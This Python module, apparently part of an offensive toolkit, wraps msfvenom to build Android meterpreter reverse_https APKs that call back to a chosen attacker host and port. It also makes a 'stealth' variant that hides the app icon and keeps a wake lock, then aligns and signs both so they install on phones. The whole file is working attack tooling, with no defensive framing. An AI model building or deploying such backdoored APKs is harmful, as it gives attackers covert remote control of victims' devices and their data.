#!/usr/bin/env python3
"""
Payload Builder Module
"""

import os
import subprocess
import shutil
import secrets
import string
from colorama import Fore, Style

class PayloadBuilder:
    def __init__(self, lhost, lport, payload_name):
        self.lhost = lhost
        self.lport = lport
        self.payload_name = payload_name
        
    def build(self):
        """Build the payload"""
        print(f"\n{Fore.YELLOW}[+] Building payload for {self.lhost}:{self.lport}{Fore.WHITE}")
        
        # Create keystore if not exists
        if not os.path.exists("debug.keystore"):
            self.create_keystore()
        
        # Create normal payload
        self.create_payload(stealth=False)
        
        # Create stealth payload
        self.create_payload(stealth=True)
        
        print(f"\n{Fore.GREEN}[+] Payload generation complete!{Fore.WHITE}")
        print(f"\n{Fore.YELLOW}[+] Files created:{Fore.WHITE}")
        print(f"  → {self.payload_name}_final.apk (Normal)")
        print(f"  → {self.payload_name}_stealth_final.apk (Stealth)")
        

    def _get_keystore_password(self):
        """Get or generate a secure keystore password."""
        # 1. Check environment variable
        env_pass = os.environ.get("ANDROID_KEYSTORE_PASS")
        if env_pass:
            return env_pass

        # 2. Check for existing password file
        pass_file = ".keystore_pass"
        if os.path.exists(pass_file):
            try:
                with open(pass_file, "r") as f:
                    return f.read().strip()
            except Exception:
                pass

        # 3. Generate new secure password
        alphabet = string.ascii_letters + string.digits
        new_pass = ''.join(secrets.choice(alphabet) for i in range(16))

        # Save it securely
        try:
            fd = os.open(pass_file, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "w") as f:
                f.write(new_pass)
        except Exception as e:
            print(f"{Fore.RED}  ✗ Warning: Could not save keystore password: {e}{Fore.WHITE}")

        return new_pass

    def create_keystore(self):
        """Create debug keystore"""
        print(f"{Fore.YELLOW}[+] Creating keystore...{Fore.WHITE}")
        password = self._get_keystore_password()
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", "debug.keystore",
            "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", password, "-keypass", password,
            "-dname", "CN=Android Debug, O=Android, C=US"
        ], capture_output=True)
        
    def create_payload(self, stealth=False):
        """Create payload with msfvenom"""
        name = f"{self.payload_name}_stealth" if stealth else self.payload_name
        print(f"\n{Fore.YELLOW}[+] Creating {'Stealth' if stealth else 'Normal'} payload...{Fore.WHITE}")
        
        cmd = [
            "msfvenom",
            "-p", "android/meterpreter/reverse_https",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "AndroidWakeLock=true",
            "-o", f"{name}.apk"
        ]
        
        if stealth:
            cmd.insert(-1, "AndroidHideAppIcon=true")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            
            if result.returncode == 0 and os.path.exists(f"{name}.apk"):
                size = os.path.getsize(f"{name}.apk") / 1024
                print(f"{Fore.GREEN}  ✓ APK created: {name}.apk ({size:.1f} KB){Fore.WHITE}")
                self.sign_apk(name)
                return True
            else:
                print(f"{Fore.RED}  ✗ Failed to create payload{Fore.WHITE}")
                if result.stderr:
                    print(f"  Error: {result.stderr[:200]}")
                return False
        except Exception as e:
            print(f"{Fore.RED}  ✗ Error: {e}{Fore.WHITE}")
            return False
    
    def sign_apk(self, name):
        """Sign the APK"""
        print(f"{Fore.YELLOW}  [+] Signing APK...{Fore.WHITE}")
        
        apk_file = f"{name}.apk"
        final_name = f"{name}_final.apk"
        aligned = f"{name}_aligned.apk"
        
        password = self._get_keystore_password()

        # Align APK
        subprocess.run(["zipalign", "-v", "4", apk_file, aligned], capture_output=True)
        
        # Sign APK
        subprocess.run([
            "apksigner", "sign", "--ks", "debug.keystore",
            "--ks-pass", f"pass:{password}", "--key-pass", f"pass:{password}",
            "--out", final_name, aligned
        ], capture_output=True)
        
        # Clean up
        if os.path.exists(aligned):
            os.remove(aligned)
        
        if os.path.exists(final_name):
            print(f"{Fore.GREEN}  ✓ Signed: {final_name}{Fore.WHITE}")
        else:
            # Fallback to jarsigner
            subprocess.run([
                "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", "debug.keystore", "-storepass", password,
                "-keypass", password, apk_file, "androiddebugkey"
            ], capture_output=True)
            shutil.copy(apk_file, final_name)
            print(f"{Fore.GREEN}  ✓ Signed (fallback): {final_name}{Fore.WHITE}")
